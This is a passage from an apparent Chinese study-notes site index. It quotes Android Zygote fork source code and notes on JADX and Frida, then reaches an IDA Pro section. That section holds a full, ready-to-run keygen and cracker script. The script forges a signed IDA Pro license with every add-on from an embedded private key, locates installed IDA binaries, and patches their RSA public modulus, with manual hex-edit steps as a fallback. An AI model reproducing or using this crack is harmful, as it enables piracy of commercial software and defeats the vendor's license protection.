runtimeFlags,\n            int[][] rlimits, long permittedCapabilities, long effectiveCapabilities) {\n        ZygoteHooks.preFork();\n\n        int pid = nativeForkSystemServer(\n                uid, gid, gids, runtimeFlags, rlimits,\n                permittedCapabilities, effectiveCapabilities);\n\n        // Set the Java Language thread priority to the default value for new apps.\n        Thread.currentThread().setPriority(Thread.NORM_PRIORITY);\n\n        ZygoteHooks.postForkCommon();\n        return pid;\n    }\n\n    private static native int nativeForkSystemServer(int uid, int gid, int[] gids, int runtimeFlags,\n            int[][] rlimits, long permittedCapabilities, long effectiveCapabilities);\n</code></pre> </li> </ol>"},{"location":"study/android/theory/#3-native-fork","title":"3. Native \u5c42\uff1a\u6267\u884c Fork","text":"<p>Java \u5c42\u7684 <code>native</code> \u65b9\u6cd5\u6700\u7ec8\u4f1a\u8c03\u7528\u5230 C++ \u5c42\u7684 <code>ForkCommon</code> \u51fd\u6570\u6765\u5b8c\u6210\u8fdb\u7a0b\u7684\u521b\u5efa\u3002</p> nativeForkAndSpecializenativeForkSystemServer /frameworks/base/core/jni/com_android_internal_os_Zygote.cpp<pre><code>// line 2529:2584\nNO_STACK_PROTECTOR\nstatic jint com_android_internal_os_Zygote_nativeForkAndSpecialize(\n        JNIEnv* env, jclass, jint uid, jint gid, jintArray gids, jint runtime_flags,\n        jobjectArray rlimits, jint mount_external, jstring se_info, jstring nice_name,\n        jintArray managed_fds_to_close, jintArray managed_fds_to_ignore, jboolean is_child_zygote,\n        jstring instruction_set, jstring app_data_dir, jboolean is_top_app,\n        jobjectArray pkg_data_info_list, jobjectArray allowlisted_data_info_list,\n        jboolean mount_data_dirs, jboolean mount_storage_dirs, jboolean mount_sysprop_overrides) {\n    jlong capabilities = CalculateCapabilities(env, uid, gid, gids, is_child_zygote);\n    jlong bounding_capabilities = CalculateBoundingCapabilities(env, uid, gid, gids);\n\n    if (UNLIKELY(managed_fds_to_close == nullptr)) {\n      zygote::ZygoteFailure(env, \"zygote\", nice_name,\n                            \"Zygote received a null fds_to_close vector.\");\n    }\n\n    std::vector&lt;int&gt; fds_to_close =\n        ExtractJIntArray(env, \"zygote\", nice_name, managed_fds_to_close).value();\n    std::vector&lt;int&gt; fds_to_ignore =\n        ExtractJIntArray(env, \"zygote\", nice_name, managed_fds_to_ignore)\n            .value_or(std::vector&lt;int&gt;());\n\n    std::vector&lt;int&gt; usap_pipes = MakeUsapPipeReadFDVector();\n\n    fds_to_close.insert(fds_to_close.end(), usap_pipes.begin(), usap_pipes.end());\n    fds_to_ignore.insert(fds_to_ignore.end(), usap_pipes.begin(), usap_pipes.end());\n\n    fds_to_close.push_back(gUsapPoolSocketFD);\n\n    if (gUsapPoolEventFD != -1) {\n      fds_to_close.push_back(gUsapPoolEventFD);\n      fds_to_ignore.push_back(gUsapPoolEventFD);\n    }\n\n    if (gSystemServerSocketFd != -1) {\n        fds_to_close.push_back(gSystemServerSocketFd);\n        fds_to_ignore.push_back(gSystemServerSocketFd);\n    }\n\n    if (gPreloadFds &amp;&amp; gPreloadFdsExtracted) {\n        fds_to_ignore.insert(fds_to_ignore.end(), gPreloadFds-&gt;begin(), gPreloadFds-&gt;end());\n    }\n\n    pid_t pid = zygote::ForkCommon(env, /* is_system_server= */ false, fds_to_close, fds_to_ignore,\n                                   true);\n\n    if (pid == 0) {\n        SpecializeCommon(env, uid, gid, gids, runtime_flags, rlimits, capabilities, capabilities,\n                         bounding_capabilities, mount_external, se_info, nice_name, false,\n                         is_child_zygote == JNI_TRUE, instruction_set, app_data_dir,\n                         is_top_app == JNI_TRUE, pkg_data_info_list, allowlisted_data_info_list,\n                         mount_data_dirs == JNI_TRUE, mount_storage_dirs == JNI_TRUE,\n                         mount_sysprop_overrides == JNI_TRUE);\n    }\n    return pid;\n}\n</code></pre> /frameworks/base/core/jni/com_android_internal_os_Zygote.cpp<pre><code>// line 2586:2642\nNO_STACK_PROTECTOR\nstatic jint com_android_internal_os_Zygote_nativeForkSystemServer(\n        JNIEnv* env, jclass, uid_t uid, gid_t gid, jintArray gids,\n        jint runtime_flags, jobjectArray rlimits, jlong permitted_capabilities,\n        jlong effective_capabilities) {\n  ATRACE_CALL();\n  std::vector&lt;int&gt; fds_to_close(MakeUsapPipeReadFDVector()),\n                   fds_to_ignore(fds_to_close);\n\n  fds_to_close.push_back(gUsapPoolSocketFD);\n\n  if (gUsapPoolEventFD != -1) {\n    fds_to_close.push_back(gUsapPoolEventFD);\n    fds_to_ignore.push_back(gUsapPoolEventFD);\n  }\n\n  if (gSystemServerSocketFd != -1) {\n      fds_to_close.push_back(gSystemServerSocketFd);\n      fds_to_ignore.push_back(gSystemServerSocketFd);\n  }\n\n  pid_t pid = zygote::ForkCommon(env, true,\n                                 fds_to_close,\n                                 fds_to_ignore,\n                                 true);\n  if (pid == 0) {\n      // System server prcoess does not need data isolation so no need to\n      // know pkg_data_info_list.\n      SpecializeCommon(env, uid, gid, gids, runtime_flags, rlimits, permitted_capabilities,\n                       effective_capabilities, 0, MOUNT_EXTERNAL_DEFAULT, nullptr, nullptr, true,\n                       false, nullptr, nullptr, /* is_top_app= */ false,\n                       /* pkg_data_info_list */ nullptr,\n                       /* allowlisted_data_info_list */ nullptr, false, false, false);\n  } else if (pid &gt; 0) {\n      // The zygote process checks whether the child process has died or not.\n      ALOGI(\"System server process %d has been created\", pid);\n      gSystemServerPid = pid;\n      // There is a slight window that the system server process has crashed\n      // but it went unnoticed because we haven't published its pid yet. So\n      // we recheck here just to make sure that all is well.\n      int status;\n      if (waitpid(pid, &amp;status, WNOHANG) == pid) {\n          ALOGE(\"System server process %d has died. Restarting Zygote!\", pid);\n          RuntimeAbort(env, __LINE__, \"System server process has died. Restarting Zygote!\");\n      }\n\n      if (UsePerAppMemcg()) {\n          // Assign system_server to the correct memory cgroup.\n          // Not all devices mount memcg so check if it is mounted first\n          // to avoid unnecessarily printing errors and denials in the logs.\n          if (!SetTaskProfiles(pid, std::vector&lt;std::string&gt;{\"SystemMemoryProcess\"})) {\n              ALOGE(\"couldn't add process %d into system memcg group\", pid);\n          }\n      }\n  }\n  return pid;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5b83\u4eec\u90fd\u8c03\u7528\u4e86 <code>ForkCommon</code> \u65b9\u6cd5\u3002\u81f3\u6b64\u6211\u4eec\u53ef\u4ee5\u5168\u5fc3\u6295\u5165\u5e38\u89c4\u8fdb\u7a0b\u7684\u5b75\u5316\u5206\u6790\uff0c\u800c <code>SystemServer</code> \u7684\u5dee\u5f02\u6211\u4eec\u653e\u5728\u540e\u7eed\u8ba8\u8bba\u3002</p> <p>\u6211\u4eec\u6765\u770b <code>ForkCommon</code> \u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u6211\u4eec\u5148\u6cbf\u7740\u8fdb\u7a0b\u7684\u521b\u5efa\u8fd9\u6761\u4e3b\u7ebf\u6765\u4e00\u8def\u770b\u4e0b\u53bb\uff1a</p> /frameworks/base/core/jni/com_android_internal_os_Zygote.cpp<pre><code>// line 2421:2523\n// Utility routine to fork a process from the zygote.\nNO_STACK_PROTECTOR\npid_t zygote::ForkCommon(JNIEnv* env, bool is_system_server,\n                         const std::vector&lt;int&gt;&amp; fds_to_close,\n                         const std::vector&lt;int&gt;&amp; fds_to_ignore,\n                         bool is_priority_fork,\n                         bool purge) {\n//...\n  pid_t pid = fork();\n\n  if (pid == 0) {\n    if (is_priority_fork) {\n      setpriority(PRIO_PROCESS, 0, PROCESS_PRIORITY_MAX);\n    } else {\n      setpriority(PRIO_PROCESS, 0, PROCESS_PRIORITY_MIN);\n    }\n//...\n  return pid;\n}\n</code></pre> <p>ForkCommon \u8c03\u7528\u4e86 <code>fork()</code> \u65b9\u6cd5\uff0c\u8fd9\u6765\u6e90\u4e8ebionic/libc/bionic/fork.cpp\uff0c\u518d\u540e\u7eed\u5c31\u9677\u5165 Linux \u5185\u6838\u7684 <code>fork</code> \u5b9e\u73b0\u7ec6\u8282\u4e86\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002</p>"},{"location":"study/android/theory/#system-server","title":"System Server","text":""},{"location":"study/android/theory/#xposed","title":"Xposed","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Lsposed \u6280\u672f\u539f\u7406\u63a2\u8ba8 &amp;&amp; \u57fa\u672c\u5b89\u88c5\u4f7f\u7528 </li> </ul>"},{"location":"study/reverse/tools/JADX/","title":"JADX","text":"<p>\u5b89\u5353java\u5c42\u53cd\u7f16\u8bd1\u795e\u5668\uff0c\u5bf9\u4e8e\u53cd\u6df7\u6dc6\u6548\u679c\u4e0d\u5982jeb\u3002</p> <p>\u4f46\u662f\u5f00\u6e90\u9879\u76ee\u7528\u7684\u5c31\u662f\u723d\u3002</p>"},{"location":"study/reverse/tools/JADX/#_1","title":"\u5b89\u88c5:","text":"<p>JADX</p>"},{"location":"study/reverse/tools/JADX/#_2","title":"\u63d2\u4ef6:","text":"<p>\u4ec0\u4e48\uff0cjadx\u4e5f\u6709\u63d2\u4ef6\uff1f</p> <ol> <li>jadx-ai-mcp</li> </ol>"},{"location":"study/reverse/tools/frida/","title":"\u90a6\u90a6\u90a6\u90a6 \u771f\u795e\u6765\u4e86 Frida","text":""},{"location":"study/reverse/tools/frida/#frida_1","title":"\u4ec0\u4e48\u662ffrida","text":"<p>frida \u662f\u4e00\u6b3e\u57fa\u4e8e python+javascript \u7684 hook \u6846\u67b6\uff0c\u53ef\u8fd0\u884c\u5728 android\u3001ios\u3001linux\u3001win\u7b49\u5404\u4e2a\u5e73\u53f0\uff0c\u4e3b\u8981\u4f7f\u7528\u7684\u52a8\u6001\u4e8c\u8fdb\u5236\u63d2\u6869\u6280\u672f\u3002</p> <p>\u9879\u76ee\u5730\u5740</p> <p>\u5b98\u7f51\u53ca\u4f7f\u7528\u6587\u6863</p>"},{"location":"study/reverse/tools/frida/#_1","title":"\u57fa\u7840\u914d\u7f6e","text":"<ol> <li>\u5b89\u88c5frida     Bash<pre><code>pip install frida-tools\n</code></pre></li> <li>\u5728\u76ee\u6807\u8bbe\u5907\u914d\u7f6e\u5bf9\u5e94\u7248\u672c\u7684frida-server\u5e76\u8fd0\u884c</li> <li>\u6d4b\u8bd5frida\u6b63\u5e38\u8fde\u63a5     Bash<pre><code>frida-ps\n</code></pre></li> </ol>"},{"location":"study/reverse/tools/frida/#_2","title":"\u57fa\u7840\u4f7f\u7528","text":"<ul> <li>frida\u4f7f\u7528python\u5c06javascript\u811a\u672c\u6ce8\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u4e2d\u8fd0\u884c\uff0c\u4ece\u800c\u5b9e\u73b0hook\u529f\u80fd</li> <li>javascript\u57fa\u7840\u8bed\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u4f46\u662f\u5728frida\u4e2d\u6709\u5927\u91cf\u81ea\u5b9a\u4e49\u63a5\u53e3\uff0c\u9700\u901a\u8fc7\u6587\u6863\u4e0e\u811a\u672c\u9605\u8bfb\u7406\u89e3\u5b66\u4e60</li> </ul>"},{"location":"study/reverse/tools/ida_pro/","title":"IDA Pro\u7684\u5b89\u88c5\u4f7f\u7528\u4ee5\u53ca\u4e00\u4e9b\u63d2\u4ef6","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e 2025-10-27</p>"},{"location":"study/reverse/tools/ida_pro/#_1","title":"\u5b89\u88c5","text":""},{"location":"study/reverse/tools/ida_pro/#_2","title":"\u76f8\u5173\u94fe\u63a5:","text":"<ul> <li>Hex-Rays \u5b98\u65b9\u7f51\u7ad9</li> <li>\u770b\u96ea\u4f6c9.2\u914d\u7f6e\u957f\u8d34</li> </ul>"},{"location":"study/reverse/tools/ida_pro/#_3","title":"\u6ce8\u518c\u673a:","text":"IDA Pro ida pro 9.1/9.2 Python<pre><code># -*- coding: utf-8 -*-\n\nimport json\nimport hashlib\nimport os\nimport platform\n\n# IDA Pro\u53ef\u80fd\u7684\u5b89\u88c5\u8def\u5f84\uff08\u6839\u636e\u4f60\u7684\u5b9e\u9645\u60c5\u51b5\u4fee\u6539\uff09\nIDA_PATHS = [\n    r\"D:\\Program Files\\IDA Pro 9.2\",\n    r\"D:\\Program Files\\IDA Pro 9.1\",\n    r\"D:\\Program Files\\IDA Professional 9.2\",\n    r\"C:\\Program Files\\IDA Pro\",\n    r\"D:\\IDA\",\n    # \u6dfb\u52a0\u5176\u4ed6\u53ef\u80fd\u7684\u8def\u5f84\n]\n\nlicense = {\n    \"header\": {\"version\": 1},\n    \"payload\": {\n        \"name\": \"IDAPRO9\",\n        \"email\": \"idapro9@example.com\",\n        \"licenses\": [\n            {\n                \"id\": \"48-2137-ACAB-99\",\n                \"edition_id\": \"ida-pro\",\n                \"description\": \"license\",\n                \"license_type\": \"named\",\n                \"product\": \"IDA\",\n                \"product_id\": \"IDAPRO\",\n                \"product_version\": \"9.1\",\n                \"seats\": 1,\n                \"start_date\": \"2024-08-10 00:00:00\",\n                \"end_date\": \"2033-12-31 23:59:59\",\n                \"issued_on\": \"2024-08-10 00:00:00\",\n                \"owner\": \"HexRays\",\n                \"add_ons\": [],\n                \"features\": [],\n            }\n        ],\n    },\n}\n\n\ndef add_every_addon(license):\n    \"\"\"\u6dfb\u52a0\u6240\u6709\u63d2\u4ef6\u5230\u8bb8\u53ef\u8bc1\"\"\"\n    platforms = [\n        \"W\",  # Windows\n        \"L\",  # Linux\n        \"M\",  # macOS\n    ]\n    addons = [\n        \"HEXX86\",\n        \"HEXX64\",\n        \"HEXARM\",\n        \"HEXARM64\",\n        \"HEXMIPS\",\n        \"HEXMIPS64\",\n        \"HEXPPC\",\n        \"HEXPPC64\",\n        \"HEXRV64\",\n        \"HEXARC\",\n        \"HEXARC64\",\n    ]\n\n    i = 0\n    for addon in addons:\n        i += 1\n        license[\"payload\"][\"licenses\"][0][\"add_ons\"].append(\n            {\n                \"id\": f\"48-1337-0000-{i:02}\",\n                \"code\": addon,\n                \"owner\": license[\"payload\"][\"licenses\"][0][\"id\"],\n                \"start_date\": \"2024-08-10 00:00:00\",\n                \"end_date\": \"2033-12-31 23:59:59\",\n            }\n        )\n\n\nadd_every_addon(license)\n\n\ndef json_stringify_alphabetical(obj):\n    \"\"\"\u5c06\u5bf9\u8c61\u8f6c\u6362\u4e3a\u6392\u5e8f\u540e\u7684JSON\u5b57\u7b26\u4e32\"\"\"\n    return json.dumps(obj, sort_keys=True, separators=(\",\", \":\"))\n\n\ndef buf_to_bigint(buf):\n    \"\"\"\u5b57\u8282\u7f13\u51b2\u533a\u8f6c\u6362\u4e3a\u5927\u6574\u6570\"\"\"\n    return int.from_bytes(buf, byteorder=\"little\")\n\n\ndef bigint_to_buf(i):\n    \"\"\"\u5927\u6574\u6570\u8f6c\u6362\u4e3a\u5b57\u8282\u7f13\u51b2\u533a\"\"\"\n    return i.to_bytes((i.bit_length() + 7) // 8, byteorder=\"little\")\n\n\n# \u539f\u59cbHexRays\u516c\u94a5\u6a21\u6570\npub_modulus_hexrays = buf_to_bigint(\n    bytes.fromhex(\n        \"edfd425cf978546e8911225884436c57140525650bcf6ebfe80edbc5fb1de68f4c66c29cb22eb668788afcb0abbb718044584b810f8970cddf227385f75d5dddd91d4f18937a08aa83b28c49d12dc92e7505bb38809e91bd0fbd2f2e6ab1d2e33c0c55d5bddd478ee8bf845fcef3c82b9d2929ecb71f4d1b3db96e3a8e7aaf93\"\n    )\n)\n\n# \u4fee\u8865\u540e\u7684\u516c\u94a5\u6a21\u6570\uff085C -&gt; CB\uff09\npub_modulus_patched = buf_to_bigint(\n    bytes.fromhex(\n        \"edfd42cbf978546e8911225884436c57140525650bcf6ebfe80edbc5fb1de68f4c66c29cb22eb668788afcb0abbb718044584b810f8970cddf227385f75d5dddd91d4f18937a08aa83b28c49d12dc92e7505bb38809e91bd0fbd2f2e6ab1d2e33c0c55d5bddd478ee8bf845fcef3c82b9d2929ecb71f4d1b3db96e3a8e7aaf93\"\n    )\n)\n\n# \u79c1\u94a5\nprivate_key = buf_to_bigint(\n    bytes.fromhex(\n        \"77c86abbb7f3bb134436797b68ff47beb1a5457816608dbfb72641814dd464dd640d711d5732d3017a1c4e63d835822f00a4eab619a2c4791cf33f9f57f9c2ae4d9eed9981e79ac9b8f8a411f68f25b9f0c05d04d11e22a3a0d8d4672b56a61f1532282ff4e4e74759e832b70e98b9d102d07e9fb9ba8d15810b144970029874\"\n    )\n)\n\n\ndef decrypt(message):\n    \"\"\"\u89e3\u5bc6\u6d88\u606f\"\"\"\n    decrypted = pow(buf_to_bigint(message), exponent, pub_modulus_patched)\n    decrypted = bigint_to_buf(decrypted)\n    return decrypted[::-1]\n\n\ndef encrypt(message):\n    \"\"\"\u52a0\u5bc6\u6d88\u606f\"\"\"\n    encrypted = pow(buf_to_bigint(message[::-1]), private_key, pub_modulus_patched)\n    encrypted = bigint_to_buf(encrypted)\n    return encrypted\n\n\nexponent = 0x13\n\n\ndef sign_hexlic(payload: dict) -&gt; str:\n    \"\"\"\u4e3a\u8bb8\u53ef\u8bc1payload\u751f\u6210\u7b7e\u540d\"\"\"\n    data = {\"payload\": payload}\n    data_str = json_stringify_alphabetical(data)\n\n    buffer = bytearray(128)\n    # \u524d33\u5b57\u8282\u662f\u968f\u673a\u6570\u636e\n    for i in range(33):\n        buffer[i] = 0x42\n\n    # \u8ba1\u7b97\u6570\u636e\u7684SHA256\u54c8\u5e0c\n    sha256 = hashlib.sha256()\n    sha256.update(data_str.encode())\n    digest = sha256.digest()\n\n    # \u5c06\u54c8\u5e0c\u503c\u590d\u5236\u5230\u7f13\u51b2\u533a\n    for i in range(32):\n        buffer[33 + i] = digest[i]\n\n    # \u52a0\u5bc6\u7f13\u51b2\u533a\n    encrypted = encrypt(buffer)\n\n    return encrypted.hex().upper()\n\n\ndef patch(filename):\n    \"\"\"\u4fee\u8865\u6587\u4ef6\u4e2d\u7684\u516c\u94a5\u6a21\u6570\"\"\"\n    if not os.path.exists(filename):\n        print(f\"\u8df3\u8fc7: {filename} - \u6587\u4ef6\u672a\u627e\u5230\")\n        return False\n\n    try:\n        with open(filename, \"rb\") as f:\n            data = f.read()\n\n        # \u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u4fee\u8865\n        if data.find(bytes.fromhex(\"EDFD42CBF978\")) != -1:\n            print(f\"\u5df2\u4fee\u8865: {filename} - \u6587\u4ef6\u5df2\u7ecf\u4fee\u8865\u8fc7\")\n            return True\n\n        # \u68c0\u67e5\u662f\u5426\u5305\u542b\u539f\u59cb\u6a21\u6570\n        if data.find(bytes.fromhex(\"EDFD425CF978\")) == -1:\n            print(f\"\u65e0\u6cd5\u4fee\u8865: {filename} - \u4e0d\u5305\u542b\u539f\u59cb\u6a21\u6570\")\n            return False\n\n        # \u6267\u884c\u4fee\u8865\n        data = data.replace(\n            bytes.fromhex(\"EDFD425CF978\"), bytes.fromhex(\"EDFD42CBF978\")\n        )\n\n        # \u521b\u5efa\u5907\u4efd\n        backup_file = filename + \".backup\"\n        if not os.path.exists(backup_file):\n            with open(backup_file, \"wb\") as f:\n                f.write(open(filename, \"rb\").read())\n            print(f\"\u5df2\u521b\u5efa\u5907\u4efd: {backup_file}\")\n\n        # \u5199\u5165\u4fee\u8865\u540e\u7684\u6587\u4ef6\n        with open(filename, \"wb\") as f:\n            f.write(data)\n\n        print(f\"\u2713 \u6210\u529f\u4fee\u8865: {filename}\")\n        return True\n\n    except Exception as e:\n        print(f\"\u2717 \u4fee\u8865\u5931\u8d25: {filename} - \u9519\u8bef: {e}\")\n        return False\n\n\ndef find_and_patch_ida_files():\n    \"\"\"\u67e5\u627e\u5e76\u4fee\u8865IDA\u6587\u4ef6\"\"\"\n    # \u6240\u6709\u53ef\u80fd\u7684IDA\u6587\u4ef6\u76ee\u6807\n    targets = [\n        \"ida.dll\", \"ida32.dll\", \"ida64.dll\",\n        \"ida.exe\", \"ida32.exe\", \"ida64.exe\",\n        \"libida.so\", \"libida32.so\", \"libida64.so\",\n        \"libida.dylib\", \"libida32.dylib\", \"libida64.dylib\"\n    ]\n\n    found_files = []\n    patched_files = []\n\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u67e5\u627eIDA Pro\u6587\u4ef6...\")\n    print(\"=\" * 60)\n\n    # \u641c\u7d22\u6240\u6709\u53ef\u80fd\u7684\u8def\u5f84\n    search_paths = IDA_PATHS.copy()\n\n    # \u6dfb\u52a0\u5f53\u524d\u76ee\u5f55\n    search_paths.append(os.getcwd())\n\n    # \u6dfb\u52a0\u73af\u5883\u53d8\u91cf\u8def\u5f84\n    if 'IDA_DIR' in os.environ:\n        search_paths.append(os.environ['IDA_DIR'])\n\n    for ida_path in search_paths:\n        if os.path.exists(ida_path):\n            print(f\"\\n\u641c\u7d22\u8def\u5f84: {ida_path}\")\n            for target in targets:\n                full_path = os.path.join(ida_path, target)\n                if os.path.exists(full_path):\n                    found_files.append(full_path)\n                    print(f\"  \u627e\u5230: {target}\")\n\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\uff0c\u5c1d\u8bd5\u5728Program Files\u4e2d\u641c\u7d22\n    if not found_files:\n        program_files = [os.environ.get('ProgramFiles', r'C:\\Program Files')]\n        if os.environ.get('ProgramFiles(x86)'):\n            program_files.append(os.environ['ProgramFiles(x86)'])\n\n        for pf in program_files:\n            for root, dirs, files in os.walk(pf):\n                if 'IDA' in root:\n                    for file in files:\n                        if any(target in file for target in ['ida', 'libida']):\n                            full_path = os.path.join(root, file)\n                            if os.path.exists(full_path) and os.path.isfile(full_path):\n                                found_files.append(full_path)\n                                print(f\"  \u627e\u5230: {full_path}\")\n\n    # \u4fee\u8865\u627e\u5230\u7684\u6587\u4ef6\n    if found_files:\n        print(f\"\\n\u627e\u5230 {len(found_files)} \u4e2a\u6587\u4ef6\uff0c\u5f00\u59cb\u4fee\u8865...\")\n        for file_path in found_files:\n            if patch(file_path):\n                patched_files.append(file_path)\n    else:\n        print(\"\\n\u26a0\ufe0f \u672a\u627e\u5230\u4efb\u4f55IDA Pro\u6587\u4ef6\")\n\n    return patched_files\n\n\ndef verify_license():\n    \"\"\"\u9a8c\u8bc1\u751f\u6210\u7684\u8bb8\u53ef\u8bc1\u6587\u4ef6\"\"\"\n    try:\n        with open('idapro.hexlic', 'r', encoding='utf-8') as f:\n            license_data = json.load(f)\n\n        print(\"\\n\" + \"=\" * 60)\n        print(\"\u8bb8\u53ef\u8bc1\u9a8c\u8bc1\u4fe1\u606f\")\n        print(\"=\" * 60)\n        print(f\"\u540d\u79f0: {license_data['payload']['name']}\")\n        print(f\"\u90ae\u7bb1: {license_data['payload']['email']}\")\n        print(f\"\u4ea7\u54c1: {license_data['payload']['licenses'][0]['product']}\")\n        print(f\"\u7248\u672c: {license_data['payload']['licenses'][0]['product_version']}\")\n        print(\n            f\"\u6709\u6548\u671f: {license_data['payload']['licenses'][0]['start_date']} \u81f3 {license_data['payload']['licenses'][0]['end_date']}\")\n        print(f\"\u63d2\u4ef6\u6570\u91cf: {len(license_data['payload']['licenses'][0]['add_ons'])}\")\n        print(f\"\u7b7e\u540d\u957f\u5ea6: {len(license_data['signature'])} \u5b57\u7b26\")\n\n        # \u68c0\u67e5\u7b7e\u540d\u683c\u5f0f\n        signature = license_data['signature']\n        if len(signature) == 512:  # 256\u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5e94\u8be5\u662f512\u5b57\u7b26\n            print(\"\u2713 \u7b7e\u540d\u957f\u5ea6\u6b63\u786e\")\n        else:\n            print(f\"\u26a0\ufe0f \u7b7e\u540d\u957f\u5ea6\u5f02\u5e38: {len(signature)} (\u671f\u671b: 512)\")\n\n        # \u68c0\u67e5\u6587\u4ef6\u5927\u5c0f\n        file_size = os.path.getsize('idapro.hexlic')\n        print(f\"\u6587\u4ef6\u5927\u5c0f: {file_size} \u5b57\u8282\")\n\n        return True\n\n    except Exception as e:\n        print(f\"\u2717 \u8bb8\u53ef\u8bc1\u9a8c\u8bc1\u9519\u8bef: {e}\")\n        return False\n\n\ndef manual_patch_instructions():\n    \"\"\"\u663e\u793a\u624b\u52a8\u4fee\u8865\u8bf4\u660e\"\"\"\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u624b\u52a8\u4fee\u8865\u8bf4\u660e\")\n    print(\"=\" * 60)\n    print(\"\u5982\u679c\u81ea\u52a8\u4fee\u8865\u5931\u8d25\uff0c\u8bf7\u624b\u52a8\u64cd\u4f5c\uff1a\")\n    print(\"1. \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff08\u5982HxD\u3001010 Editor\uff09\")\n    print(\"2. \u6253\u5f00IDA\u7684DLL\u6216EXE\u6587\u4ef6\")\n    print(\"3. \u641c\u7d22\u5341\u516d\u8fdb\u5236\u503c: ED FD 42 5C F9 78\")\n    print(\"4. \u66ff\u6362\u4e3a: ED FD 42 CB F9 78\")\n    print(\"5. \u4fdd\u5b58\u6587\u4ef6\")\n    print(\"\\n\u9700\u8981\u4fee\u8865\u7684\u6587\u4ef6\u901a\u5e38\u5305\u62ec\uff1a\")\n    print(\"   - ida64.dll / ida64.exe (64\u4f4d\u7248\u672c)\")\n    print(\"   - ida32.dll / ida32.exe (32\u4f4d\u7248\u672c)\")\n    print(\"   - libida64.so / libida64.dylib (Linux/macOS)\")\n\n\ndef usage_instructions():\n    \"\"\"\u663e\u793a\u4f7f\u7528\u8bf4\u660e\"\"\"\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u4f7f\u7528\u8bf4\u660e\")\n    print(\"=\" * 60)\n    print(\"1. \u8bb8\u53ef\u8bc1\u6587\u4ef6: idapro.hexlic\")\n    print(\"   \u4f4d\u7f6e: \u5f53\u524d\u76ee\u5f55\")\n    print(\"\")\n    print(\"2. \u5b89\u88c5\u6b65\u9aa4:\")\n    print(\"   a) \u5c06 idapro.hexlic \u590d\u5236\u5230:\")\n    print(\"      IDA\u5b89\u88c5\u76ee\u5f55/licenses/ \u6587\u4ef6\u5939\")\n    print(\"\")\n    print(\"   b) \u786e\u4fddIDA\u5e93\u6587\u4ef6\u5df2\u6b63\u786e\u4fee\u8865\")\n    print(\"      (\u5c065C\u6539\u4e3aCB)\")\n    print(\"\")\n    print(\"3. \u542f\u52a8IDA Pro\uff0c\u5e94\u8be5\u4f1a\u81ea\u52a8\u52a0\u8f7d\u8bb8\u53ef\u8bc1\")\n    print(\"\")\n    print(\"4. \u5982\u679c\u9047\u5230\u95ee\u9898:\")\n    print(\"   - \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u4fee\u8865\u6210\u529f\")\n    print(\"   - \u5c1d\u8bd5\u624b\u52a8\u4fee\u8865\")\n    print(\"   - \u786e\u4fdd\u8bb8\u53ef\u8bc1\u6587\u4ef6\u5728\u6b63\u786e\u4f4d\u7f6e\")\n\n\ndef main():\n    \"\"\"\u4e3b\u51fd\u6570\"\"\"\n    print(\"IDA Pro \u8bb8\u53ef\u8bc1\u751f\u6210\u5668\")\n    print(\"\u7248\u672c: 1.0\")\n    print(\"=\" * 60)\n\n    # \u751f\u6210\u8bb8\u53ef\u8bc1\n    try:\n        print(\"\\n\u751f\u6210\u8bb8\u53ef\u8bc1...\")\n        license[\"signature\"] = sign_hexlic(license[\"payload\"])\n        serialized = json_stringify_alphabetical(license)\n\n        with open(\"idapro.hexlic\", \"w\", encoding='utf-8') as f:\n            f.write(serialized)\n\n        print(\"\u2713 \u8bb8\u53ef\u8bc1\u6587\u4ef6\u751f\u6210\u6210\u529f: idapro.hexlic\")\n\n    except Exception as e:\n        print(f\"\u2717 \u8bb8\u53ef\u8bc1\u751f\u6210\u5931\u8d25: {e}\")\n        return\n\n    # \u9a8c\u8bc1\u8bb8\u53ef\u8bc1\n    verify_license()\n\n    # \u67e5\u627e\u5e76\u4fee\u8865\u6587\u4ef6\n    patched_files = find_and_patch_ida_files()\n\n    # \u663e\u793a\u7ed3\u679c\n    if patched_files:\n        print(f\"\\n\u2713 \u6210\u529f\u4fee\u8865 {len(patched_files)} \u4e2a\u6587\u4ef6\")\n    else:\n        print(\"\\n\u26a0\ufe0f \u6ca1\u6709\u6587\u4ef6\u88ab\u4fee\u8865\uff0c\u9700\u8981\u624b\u52a8\u64cd\u4f5c\")\n        manual_patch_instructions()\n\n    # \u663e\u793a\u4f7f\u7528\u8bf4\u660e\n    usage_instructions()\n\n    # \u663e\u793a\u8bb8\u53ef\u8bc1\u6587\u4ef6\u5185\u5bb9\u9884\u89c8\n    try:\n        with open('idapro.hexlic', 'r', encoding='utf-8') as f:\n            content = f.read()\n            print(f\"\\n\u8bb8\u53ef\u8bc1\u6587\u4ef6\u9884\u89c8 (\u524d200\u5b57\u7b26):\")\n            print(content[:200] + \"...\" if len(content) &gt; 200 else content)\n    except:\n        pass\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"study/reverse/tools/ida_pro/#_4","title":"\u63a8\u8350\u63d2\u4ef6","text":"<ol> <li>Findcrypt<ul> <li>\u7528\u4e8e\u67e5\u627e\u52a0\u89e3\u5bc6\u7b97\u6cd5</li> </ul> </li> <li>WPeChatGPT<ul> <li>\u4f7f\u7528OpenAI\u63a5\u53e3\u5411\u5927\u6a21\u578b\u8bf7\u6c42\u4ee3\u7801\u5206\u6790</li> </ul> </li> <li>ida-pro-mcp<ul> <li>\u901a\u8fc7\u672c\u5730mcp\u670d\u52a1\u8ba9\u5927\u6a21\u578b\u8c03\u7528ida\u63a5\u53e3\u5206\u6790\u4ee3\u7801</li> <li>\u4ec0\u4e48\u65f6\u5019\u51fa\u8c03\u8bd5\u529f\u80fd\u545c\u545c\u545c</li> </ul> </li> <li>ScyllaHide<ul> 